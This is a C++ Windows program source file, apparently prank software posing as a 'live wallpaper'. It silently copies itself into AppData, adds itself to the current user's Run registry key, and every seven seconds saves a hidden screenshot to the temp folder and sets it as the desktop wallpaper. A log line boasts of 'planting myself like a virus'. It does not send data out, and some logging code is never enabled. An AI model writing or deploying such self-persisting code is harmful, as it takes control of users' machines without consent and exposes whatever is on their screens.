    #include <windows.h>
    #include <iostream>
    #include <string>
    #include <thread>
    #include <atomic>
    #include <chrono>
    #include <shlobj.h>     // for SHGetKnownFolderPath
    #include <knownfolders.h>
    #include <filesystem>   // C++17+, for path stuff — if not, use manual string concat
    #include <fstream>

    #define LOGW(msg) do { if (logFile.is_open()) { logFile << msg << L"\n"; logFile.flush(); } } while(0)

    #pragma comment(lib, "shell32.lib")

    std::wofstream logFile;
    std::atomic<bool> running(true);


    std::wstring GetAppDataPath();
    void SetScreenshotAsWallpaper();

    bool InitLog() {
        std::wstring appdata = GetAppDataPath();
        if (appdata.empty()) return false;

        std::wstring logPath = appdata + L"\\LiveWallpaper\\wallpaper_psycho.log";
        logFile.open(logPath, std::ios::app);
        return logFile.is_open();
    }


    void WallpaperLoop() {
        while (running) {
            SetScreenshotAsWallpaper();
            std::this_thread::sleep_for(std::chrono::seconds(7));
        }
    }

    std::wstring GetAppDataPath() {
        PWSTR path = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_CREATE, nullptr, &path))) {
            std::wstring p = path;
            CoTaskMemFree(path);
            return p;
        }
        return L""; 
    }

    std::wstring GetOurInstallPath() {
        wchar_t exePath[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        return exePath;
    }

    bool IsAlreadyInstalled() {
        std::wstring appdata = GetAppDataPath();
        if (appdata.empty()) return false;

        std::wstring targetDir = appdata + L"\\LiveWallpaper";  
        std::wstring targetExe = targetDir + L"\\wallpaper_cycle.exe";  

        return GetOurInstallPath().find(targetExe) != std::wstring::npos;
    }

    bool InstallSelf() {
        std::wstring src = GetOurInstallPath();
        std::wstring appdata = GetAppDataPath();
        if (appdata.empty()) return false;

        std::wstring dir = appdata + L"\\LiveWallpaper";
        CreateDirectoryW(dir.c_str(), nullptr);  // ignore if exists

        std::wstring dest = dir + L"\\wallpaper_cycle.exe";

        if (!CopyFileW(src.c_str(), dest.c_str(), FALSE)) {  // FALSE = overwrite if exists
            LOGW(L"Copy failed  \n");
            return false;
        }

        // Add to Run key
        HKEY hKey;
        LONG res = RegOpenKeyExW(HKEY_CURRENT_USER,
                                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, KEY_SET_VALUE, &hKey);
        if (res != ERROR_SUCCESS) {
            std::wcerr << L"RegOpen failed: " << res << L"\n";
            return false;
        }

        std::wstring valueName = L"LiveWallPaper";  
        res = RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
                            (BYTE*)dest.c_str(), (DWORD)((dest.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);

        if (res != ERROR_SUCCESS) {
            std::wcerr << L"RegSet failed: " << res << L"\n";
            return false;
        }

        return true;
    }

    void SetScreenshotAsWallpaper() {
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);

        HDC hScreen = GetDC(NULL);
        HDC hDC = CreateCompatibleDC(hScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);

        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);

        BITMAPFILEHEADER bmfHeader = {0};
        BITMAPINFOHEADER bi = {0};

        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp.bmWidth;
        bi.biHeight = bmp.bmHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;

        DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;

        HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
        char* lpbitmap = (char*)GlobalLock(hDIB);

        GetDIBits(hScreen, hBitmap, 0, bmp.bmHeight,
                lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);

        std::wstring filePath = std::wstring(tempPath) + L"wall.bmp";

        HANDLE hFile = CreateFileW(filePath.c_str(),
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_HIDDEN, NULL);

        DWORD dwSizeOfDIB = dwBmpSize +
            sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        bmfHeader.bfOffBits =
            sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bmfHeader.bfSize = dwSizeOfDIB;
        bmfHeader.bfType = 0x4D42;

        DWORD dwBytesWritten = 0;
        WriteFile(hFile, &bmfHeader, sizeof(bmfHeader), &dwBytesWritten, NULL);
        WriteFile(hFile, &bi, sizeof(bi), &dwBytesWritten, NULL);
        WriteFile(hFile, lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

        CloseHandle(hFile);

        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            (PVOID)filePath.c_str(),
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        );

        GlobalUnlock(hDIB);
        GlobalFree(hDIB);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
    }

    int main() {
        if (!IsAlreadyInstalled()) {
            LOGW(L"Not installed yet... planting myself like a virus lol\n");
            if (InstallSelf()) {
                if (logFile.is_open()) {
                    logFile << L"Installed to AppData + startup. Relaunching...\n";
                    logFile.flush() ;           // optional but nice
                }
                // Optional: ShellExecute the new exe and exit
                // But simplest: just let it run — next launch will detect it's already there
            } else {
                LOGW(L"Install failed, running in temp mode like a peasant\n");
            }
        }
        std::thread worker(WallpaperLoop);

        SetScreenshotAsWallpaper();

        LOGW("Screenshot applied as wallpaper.\n");
        worker.join();
        return 0;
    }
int WINAPI WinMain(
    HINSTANCE,
    HINSTANCE,
    LPSTR,
    int
)
{
    return main();
}